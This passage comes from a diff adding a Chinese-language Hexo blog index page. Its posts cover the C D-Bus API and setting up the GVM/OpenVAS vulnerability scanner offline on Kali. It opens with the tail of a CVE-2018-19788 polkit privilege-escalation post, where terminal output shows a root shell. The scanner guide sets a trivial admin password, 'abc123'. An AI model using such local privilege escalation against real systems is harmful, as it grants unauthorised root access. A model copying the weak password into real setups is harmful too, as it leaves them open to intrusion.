run-u95.service</span><br><span class="line">Press ^] three times within 1s to disconnect TTY.</span><br><span class="line">root@nfs2:/#id</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@nfs2:/# uid=0(root) gid=0(root) 组=0(root)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2022/01/28/cve-2018-19788/" data-id="cl0j9vktb0001lq142uaydvzj" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/polkit/" rel="tag">polkit</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-demo使用说明" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/25/demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" class="article-date">
+  <time datetime="2022-01-25T10:54:52.000Z" itemprop="datePublished">2022-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/25/demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">demo使用说明</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2022/01/25/demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" data-id="cl0j9vkts000mlq14757qbf3s" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/c-demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" rel="tag">c demo使用说明</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-dbus-c" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/24/dbus-c/" class="article-date">
+  <time datetime="2022-01-24T10:11:29.000Z" itemprop="datePublished">2022-01-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/24/dbus-c/">dbus_c</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="C-dbus开发"><a href="#C-dbus开发" class="headerlink" title="C dbus开发"></a>C dbus开发</h2><h3 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h3><p>dbus错误结构体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DBusError error;</span><br><span class="line">dbus_error_init(&amp;error); </span><br></pre></td></tr></table></figure>
+
+<p>连接到dbus总线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBusConnection* connection = dbus_bus_get(DBUS_BUS_SYSTEM, &amp;error);</span><br></pre></td></tr></table></figure>
+
+<p>如果要用system bus，第一个参数就是DBUS_BUS_SYSTEM，如果要用session bus，那么第一个参数就是DBUS_BUS_SESSION</p>
+<p>注册连接名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ret = dbus_bus_request_name(connection, sender.bus_name, DBUS_NAME_FLAG_REPLACE_EXISTING, &amp;error);</span><br></pre></td></tr></table></figure>
+
+<p>第二个参数为 DBUS_APPLICATION sender；</p>
+<p>接着创建完善和发送dbus消息，这个流程是发送信号的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DBusMessage* message = dbus_message_new_signal(receiver.object_path, receiver.interface_name, receiver.member_name);</span><br><span class="line">dbus_message_iter_init_append(message, &amp;iter);</span><br><span class="line">dbus_connection_send(connection, message, &amp;serial)</span><br></pre></td></tr></table></figure>
+
+<p>如果是要发送函数调用，发送流程如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DBusMessage* message = dbus_message_new_signal(receiver.object_path, receiver.interface_name, receiver.member_name);</span><br><span class="line">dbus_message_iter_init_append(message, &amp;iter);</span><br><span class="line">dbus_connection_send_with_reply(connection, message, &amp;pending, DBUS_TIMEOUT_USE_DEFAULT)</span><br></pre></td></tr></table></figure>
+
+<p>阻塞等待函数返回结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbus_pending_call_block(pending);              </span><br><span class="line">message = dbus_pending_call_steal_reply(pending);</span><br><span class="line">dbus_pending_call_unref(pending);</span><br></pre></td></tr></table></figure>
+
+<p>提取结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbus_message_iter_init(message, &amp;iter)</span><br><span class="line">ret = dbus_message_iter_get_arg_type(&amp;iter);</span><br></pre></td></tr></table></figure>
+
+<h3 id="接受消息"><a href="#接受消息" class="headerlink" title="接受消息"></a>接受消息</h3><p>dbus错误结构体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DBusError error;</span><br><span class="line">dbus_error_init(&amp;error); </span><br></pre></td></tr></table></figure>
+
+<p>连接到dbus总线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBusConnection* connection = dbus_bus_get(DBUS_BUS_SYSTEM, &amp;error);</span><br></pre></td></tr></table></figure>
+
+<p>注册连接名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ret = dbus_bus_request_name(connection, sender.bus_name, DBUS_NAME_FLAG_REPLACE_EXISTING, &amp;error);</span><br></pre></td></tr></table></figure>
+
+<p>添加消息筛选</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbus_bus_add_match(connection, rule, &amp;error);</span><br></pre></td></tr></table></figure>
+
+<p>rule为char*</p>
+<p>循环接收和处理消息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbus_connection_read_write(connection, 0);</span><br><span class="line">message = dbus_connection_pop_message(connection);</span><br></pre></td></tr></table></figure>
+
+<p>分析接收到的消息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbus_message_is_signal(message, self.interface_name, DBUS_MEMBER_SIGNAL)</span><br><span class="line">dbus_message_is_method_call(message, self.interface_name, DBUS_MEMBER_METHOD)</span><br></pre></td></tr></table></figure>
+
+<p>根据这两个函数的返回值判断接收到的是一个信号还是一个函数调用请求</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2022/01/24/dbus-c/" data-id="cl0j9vktj0003lq14ggdr1v6c" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dbus/" rel="tag">dbus</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-openvas本地化" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/11/30/openvas%E6%9C%AC%E5%9C%B0%E5%8C%96/" class="article-date">
+  <time datetime="2021-11-30T04:26:39.000Z" itemprop="datePublished">2021-11-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/30/openvas%E6%9C%AC%E5%9C%B0%E5%8C%96/">gvm离线初始化</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>此文档是在安装完gvm组件的kali系统上离线完成gvm初始化的操作文档</p>
+<h1 id="首先要先把gvm组件安装好（这一步如果需要，可以之后可以修改成将必要的包下载到本地来安装）"><a href="#首先要先把gvm组件安装好（这一步如果需要，可以之后可以修改成将必要的包下载到本地来安装）" class="headerlink" title="首先要先把gvm组件安装好（这一步如果需要，可以之后可以修改成将必要的包下载到本地来安装）"></a>首先要先把gvm组件安装好（这一步如果需要，可以之后可以修改成将必要的包下载到本地来安装）</h1><p>先修改 /etc/apt/sources.list ，将kali源更换一下，如果默认是这个源就不用换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
+<p>执行下面命令将gvm相关的组建安装好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# apt update</span><br><span class="line">└─# apt install gvm*</span><br></pre></td></tr></table></figure>
+<p>安装完可以查看下gvm的安装版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# gvmd --version                                                    127 ⨯</span><br><span class="line">Greenbone Vulnerability Manager 21.4.4</span><br><span class="line">Manager DB revision 242</span><br><span class="line">Copyright (C) 2009-2021 Greenbone Networks GmbH</span><br><span class="line">License: AGPL-3.0-or-later</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br></pre></td></tr></table></figure>
+
+<h1 id="断网初始化gvm"><a href="#断网初始化gvm" class="headerlink" title="断网初始化gvm"></a>断网初始化gvm</h1><p>如果是联网的环境，可以直接执行下面命令开始进行gvm的初始化流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# gvm-setup</span><br></pre></td></tr></table></figure>
+<h2 id="检查postgreSql的版本"><a href="#检查postgreSql的版本" class="headerlink" title="检查postgreSql的版本"></a>检查postgreSql的版本</h2><p>在安装过程成，可能会遇到系统里有两个版本PostgreSQL的情况<br>最新版本的gvm需要14版本的postgresql数据库，如果系统里默认的主版本是13版本，就需要修改一下</p>
+<h3 id="先查看系统里的PostgreSQL版本"><a href="#先查看系统里的PostgreSQL版本" class="headerlink" title="先查看系统里的PostgreSQL版本"></a>先查看系统里的PostgreSQL版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# pg_lsclusters</span><br><span class="line">Ver Cluster Port Status Owner    Data directory              Log file</span><br><span class="line">13  main    5432 down   postgres /var/lib/postgresql/13/main /var/log/postgresql/postgresql-13-main.log</span><br><span class="line">14  main    5433 down   postgres /var/lib/postgresql/14/main /var/log/postgresql/postgresql-14-main.log</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除13版本的PostgreSQL"><a href="#删除13版本的PostgreSQL" class="headerlink" title="删除13版本的PostgreSQL"></a>删除13版本的PostgreSQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# pg_dropcluster --stop 13 main</span><br></pre></td></tr></table></figure>
+<h3 id="将14设置为主要版本"><a href="#将14设置为主要版本" class="headerlink" title="将14设置为主要版本"></a>将14设置为主要版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# pg_upgradecluster 14 main</span><br></pre></td></tr></table></figure>
+<p>然后把14版本的PostgreSQL监听端口修改成5432</p>
+<p>修改/etc/postgresql/14/main/postgresql.conf ，将其中的port = 修改为5432</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">port = 5432                             # (change requires restart)</span><br><span class="line">max_connections = 100                   # (change requires restart)</span><br><span class="line">#superuser_reserved_connections = 3     # (change requires restart)</span><br><span class="line">unix_socket_directories = &#x27;/var/run/postgresql&#x27; # comma-separated list of directories</span><br></pre></td></tr></table></figure>
+
+<h2 id="解压初始化脚本包"><a href="#解压初始化脚本包" class="headerlink" title="解压初始化脚本包"></a>解压初始化脚本包</h2><p>我已经将修改过的初始化脚本和备份好的数据库文件打包成init_gvm.tar.gz包</p>
+<h3 id="解压压缩包"><a href="#解压压缩包" class="headerlink" title="解压压缩包"></a>解压压缩包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# tar -xzvf init_gvm.tar.gz</span><br><span class="line">init_gvm/</span><br><span class="line">init_gvm/init.sh</span><br><span class="line">init_gvm/greenbone-feed-sync</span><br><span class="line">init_gvm/plugins.tar.gz</span><br><span class="line">init_gvm/greenbone-nvt-sync</span><br><span class="line">init_gvm/gvm.tar.gz</span><br></pre></td></tr></table></figure>
+<h3 id="进入到init-gvm目录，执行init脚本"><a href="#进入到init-gvm目录，执行init脚本" class="headerlink" title="进入到init_gvm目录，执行init脚本"></a>进入到init_gvm目录，执行init脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/init_gvm]</span><br><span class="line">└─# sudo sh init.sh</span><br></pre></td></tr></table></figure>
+<h3 id="执行gvm-setup并等待初始化完成"><a href="#执行gvm-setup并等待初始化完成" class="headerlink" title="执行gvm-setup并等待初始化完成"></a>执行gvm-setup并等待初始化完成</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/init_gvm]</span><br><span class="line">└─# gvm-setup</span><br></pre></td></tr></table></figure>
+<h3 id="执行gvm-check-setup检查初始化是否成功"><a href="#执行gvm-check-setup检查初始化是否成功" class="headerlink" title="执行gvm-check-setup检查初始化是否成功"></a>执行gvm-check-setup检查初始化是否成功</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/init_gvm]</span><br><span class="line">└─# gvm-check-setup</span><br><span class="line">gvm-check-setup 21.4.3</span><br><span class="line">  Test completeness and readiness of GVM-21.4.3</span><br><span class="line">Step 1: Checking OpenVAS (Scanner)...</span><br><span class="line">        OK: OpenVAS Scanner is present in version 21.4.3.</span><br><span class="line">        OK: Server CA Certificate is present as /var/lib/gvm/CA/servercert.pem.</span><br><span class="line">Checking permissions of /var/lib/openvas/gnupg/*</span><br><span class="line">        OK: _gvm owns all files in /var/lib/openvas/gnupg</span><br><span class="line">        OK: redis-server is present.</span><br><span class="line">        OK: scanner (db_address setting) is configured properly using the redis-server socket: /var/run/redis-openvas/redis-server.sock</span><br><span class="line">        OK: redis-server is running and listening on socket: /var/run/redis-openvas/redis-server.sock.</span><br><span class="line">        OK: redis-server configuration is OK and redis-server is running.</span><br><span class="line">        OK: _gvm owns all files in /var/lib/openvas/plugins</span><br><span class="line">        OK: NVT collection in /var/lib/openvas/plugins contains 77525 NVTs.</span><br><span class="line">Checking that the obsolete redis database has been removed</span><br><span class="line">        OK: No old Redis DB</span><br><span class="line">        OK: ospd-OpenVAS is present in version 21.4.3.</span><br><span class="line">Step 2: Checking GVMD Manager ...</span><br><span class="line">        OK: GVM Manager (gvmd) is present in version 21.4.4.</span><br><span class="line">Step 3: Checking Certificates ...</span><br><span class="line">        OK: GVM client certificate is valid and present as /var/lib/gvm/CA/clientcert.pem.</span><br><span class="line">        OK: Your GVM certificate infrastructure passed validation.</span><br><span class="line">Step 4: Checking data ...</span><br><span class="line">        OK: SCAP data found in /var/lib/gvm/scap-data.</span><br><span class="line">        OK: CERT data found in /var/lib/gvm/cert-data.</span><br><span class="line">Step 5: Checking Postgresql DB and user ...</span><br><span class="line">        OK: Postgresql version and default port are OK.</span><br><span class="line"> gvmd      | _gvm     | UTF8     | zh_CN.UTF-8 | zh_CN.UTF-8 |</span><br><span class="line">        OK: At least one user exists.</span><br><span class="line">Step 6: Checking Greenbone Security Assistant (GSA) ...</span><br><span class="line">Oops, secure memory pool already initialized</span><br><span class="line">        OK: Greenbone Security Assistant is present in version 21.4.3.</span><br><span class="line">Step 7: Checking if GVM services are up and running ...</span><br><span class="line">        Starting ospd-openvas service</span><br><span class="line">        Waiting for ospd-openvas service</span><br><span class="line">        OK: ospd-openvas service is active.</span><br><span class="line">        Starting gvmd service</span><br><span class="line">        Waiting for gvmd service</span><br><span class="line">        OK: gvmd service is active.</span><br><span class="line">        Starting greenbone-security-assistant service</span><br><span class="line">        Waiting for greenbone-security-assistant service</span><br><span class="line">        OK: greenbone-security-assistant service is active.</span><br><span class="line">Step 8: Checking few other requirements...</span><br><span class="line">        OK: nmap is present in version 21.4.3.</span><br><span class="line">        OK: ssh-keygen found, LSC credential generation for GNU/Linux targets is likely to work.</span><br><span class="line">        WARNING: Could not find makensis binary, LSC credential package generation for Microsoft Windows targets will not work.</span><br><span class="line">        SUGGEST: Install nsis.</span><br><span class="line">        OK: xsltproc found.</span><br><span class="line">        WARNING: Your password policy is empty.</span><br><span class="line">        SUGGEST: Edit the /etc/gvm/pwpolicy.conf file to set a password policy.</span><br><span class="line"></span><br><span class="line">It seems like your GVM-21.4.3 installation is OK.</span><br></pre></td></tr></table></figure>
+<p>显示如上结果则表明初始化过程成功完成<br>然后重启下gvm的服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/init_gvm]</span><br><span class="line">└─# gvm-stop</span><br><span class="line">┌──(root💀kali)-[/home/kali/init_gvm]</span><br><span class="line">└─# gvm-start                                                           3 ⨯</span><br><span class="line">[&gt;] Please wait for the GVM services to start.</span><br><span class="line">[&gt;]</span><br><span class="line">[&gt;] You might need to refresh your browser once it opens.</span><br><span class="line">[&gt;]</span><br><span class="line">[&gt;]  Web UI (Greenbone Security Assistant): https://127.0.0.1:9392</span><br><span class="line"></span><br><span class="line">● greenbone-security-assistant.service - Greenbone Security Assistant (gsad)</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/greenbone-security-assistant.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (running) since Tue 2021-11-30 18:30:45 CST; 9ms ago</span><br><span class="line">       Docs: man:gsad(8)</span><br><span class="line">             https://www.greenbone.net</span><br><span class="line">    Process: 6970 ExecStart=/usr/sbin/gsad --listen=127.0.0.1 --port=9392 (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 6971 (gsad)</span><br><span class="line">      Tasks: 3 (limit: 4578)</span><br><span class="line">     Memory: 2.1M</span><br><span class="line">        CPU: 15ms</span><br><span class="line">     CGroup: /system.slice/greenbone-security-assistant.service</span><br><span class="line">             ├─6971 /usr/sbin/gsad --listen=127.0.0.1 --port=9392</span><br><span class="line">             └─6972 /usr/sbin/gsad --listen=127.0.0.1 --port=9392</span><br><span class="line"></span><br><span class="line">11月 30 18:30:45 kali systemd[1]: Starting Greenbone Security Assistant (gsad)...</span><br><span class="line">11月 30 18:30:45 kali gsad[6970]: Oops, secure memory pool already initialized</span><br><span class="line">11月 30 18:30:45 kali systemd[1]: Started Greenbone Security Assistant (gsad).</span><br><span class="line"></span><br><span class="line">● gvmd.service - Greenbone Vulnerability Manager daemon (gvmd)</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/gvmd.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (running) since Tue 2021-11-30 18:30:40 CST; 5s ago</span><br><span class="line">       Docs: man:gvmd(8)</span><br><span class="line">    Process: 6939 ExecStart=/usr/sbin/gvmd --osp-vt-update=/run/ospd/ospd.sock --listen-group=_gvm (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 6945 (gvmd)</span><br><span class="line">      Tasks: 1 (limit: 4578)</span><br><span class="line">     Memory: 5.2M</span><br><span class="line">        CPU: 63ms</span><br><span class="line">     CGroup: /system.slice/gvmd.service</span><br><span class="line">             └─6945 &quot;gvmd: Waiting for incoming connections&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot;</span><br><span class="line"></span><br><span class="line">11月 30 18:30:39 kali systemd[1]: Starting Greenbone Vulnerability Manager daemon (gvmd)...</span><br><span class="line">11月 30 18:30:39 kali systemd[1]: gvmd.service: Can&#x27;t open PID file /run/gvm/gvmd.pid (yet?) after start: Operation not permitted</span><br><span class="line">11月 30 18:30:40 kali systemd[1]: Started Greenbone Vulnerability Manager daemon (gvmd).</span><br><span class="line"></span><br><span class="line">● ospd-openvas.service - OSPd Wrapper for the OpenVAS Scanner (ospd-openvas)</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/ospd-openvas.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (running) since Tue 2021-11-30 18:30:39 CST; 5s ago</span><br><span class="line">       Docs: man:ospd-openvas(8)</span><br><span class="line">             man:openvas(8)</span><br><span class="line">    Process: 6935 ExecStart=/usr/bin/ospd-openvas --config /etc/gvm/ospd-openvas.conf --log-config /etc/gvm/ospd-logging.conf --unix-socket /run/ospd/ospd.sock --pid-file /run/ospd/ospd-openvas.pid --log-file /var/log/gvm/ospd-openvas.log --lock-file-dir /var/lib/openvas (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 6937 (ospd-openvas)</span><br><span class="line">      Tasks: 4 (limit: 4578)</span><br><span class="line">     Memory: 24.0M</span><br><span class="line">        CPU: 199ms</span><br><span class="line">     CGroup: /system.slice/ospd-openvas.service</span><br><span class="line">             ├─6937 /usr/bin/python3 /usr/bin/ospd-openvas --config /etc/gvm/ospd-openvas.conf --log-config /etc/gvm/ospd-logging.conf --unix-socket /run/ospd/ospd.sock --pid-file /run/ospd/ospd-openvas.pid --log-file /var/log/gvm/ospd-openvas.log --lock-file-dir /var/lib/openvas</span><br><span class="line">             └─6940 /usr/bin/python3 /usr/bin/ospd-openvas --config /etc/gvm/ospd-openvas.conf --log-config /etc/gvm/ospd-logging.conf --unix-socket /run/ospd/ospd.sock --pid-file /run/ospd/ospd-openvas.pid --log-file /var/log/gvm/ospd-openvas.log --lock-file-dir /var/lib/openvas</span><br><span class="line"></span><br><span class="line">11月 30 18:30:39 kali systemd[1]: Starting OSPd Wrapper for the OpenVAS Scanner (ospd-openvas)...</span><br><span class="line">11月 30 18:30:39 kali systemd[1]: Started OSPd Wrapper for the OpenVAS Scanner (ospd-openvas).</span><br><span class="line"></span><br><span class="line">[&gt;] Opening Web UI (https://127.0.0.1:9392) in: 5... 4... 3... 2... 1...</span><br></pre></td></tr></table></figure>
+<h3 id="设置用户名和密码"><a href="#设置用户名和密码" class="headerlink" title="设置用户名和密码"></a>设置用户名和密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/init_gvm]</span><br><span class="line">└─# runuser -u _gvm -- gvmd --user=admin --new-password=abc123</span><br></pre></td></tr></table></figure>
+
+<h2 id="gvm-使用"><a href="#gvm-使用" class="headerlink" title="gvm 使用"></a>gvm 使用</h2><p>打开浏览器，输入127.0.0.1:9392 如图，点击advanced,然后再点击 Accept the Risk and Continue<br><img src="./openvas%E6%9C%AC%E5%9C%B0%E5%8C%96/1.png" alt="1"></p>
+<p>输入刚才设置的用户名密码<br><img src="./openvas%E6%9C%AC%E5%9C%B0%E5%8C%96/2.png" alt="2"></p>
+<p>在Administration栏中选择feed status<br><img src="./openvas%E6%9C%AC%E5%9C%B0%E5%8C%96/3.png" alt="3"><br>等SCAP CERT GVMD_DATA的Status项从updating…的状态变为 xx days之后，就可以正常使用gvm来进行漏洞扫描了。</p>
+<h1 id="更新数据库"><a href="#更新数据库" class="headerlink" title="更新数据库"></a>更新数据库</h1><h2 id="联网机器"><a href="#联网机器" class="headerlink" title="联网机器"></a>联网机器</h2><p>联网的机器更新更新漏洞数据库只需要执行下面命令即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/wky]</span><br><span class="line">└─# gvm-feed-update</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="断网机器更新"><a href="#断网机器更新" class="headerlink" title="断网机器更新"></a>断网机器更新</h2><p>断网机器更新需要先将更新好的机器中数据库文件整体打包出来</p>
